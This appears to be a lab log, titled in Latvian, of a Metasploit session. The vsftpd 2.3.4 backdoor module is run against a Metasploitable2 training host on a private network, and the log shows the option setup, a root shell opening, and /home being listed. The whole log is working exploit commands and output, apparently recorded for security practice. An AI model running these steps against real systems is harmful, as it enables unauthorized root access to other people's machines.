**Metasploitable-framework rezultātu izvade**
=============================================

**msf6 > use exploit/unix/ftp/vsftpd_234_backdoor**
```
[*] No payload configured, defaulting to cmd/unix/interact

```
**msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options**
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```
**msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set Rhost 192.168.1.11**
```
Rhost => 192.168.1.11
```
**msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options**
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.1.11     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) >

```
**msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit**
```
[*] 192.168.1.11:21 - The port used by the backdoor bind listener is already open
[+] 192.168.1.11:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.175:39391 -> 192.168.1.11:6200) at 2025-05-22 21:16:04 +0300
```
**ls /home**
```
ftp
msfadmin
service
user
```
**ls /home** (no docker konteinera, kurā ir uzstadīts metasploitable2)
```
root@b2bd6545425e:/# ls /home
ftp  msfadmin  service  user

```

